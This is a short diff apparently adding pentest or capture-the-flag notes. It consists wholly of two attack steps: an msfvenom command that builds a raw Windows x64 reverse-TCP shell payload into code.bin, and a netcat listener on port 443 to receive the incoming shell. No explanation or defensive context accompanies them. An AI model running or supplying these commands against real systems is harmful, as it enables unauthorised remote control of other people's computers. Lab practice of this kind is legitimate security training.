@@ -1,0 +1,4 @@
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f raw -o code.bin
+
+On Other terminal
+$ nc -nvlp 443
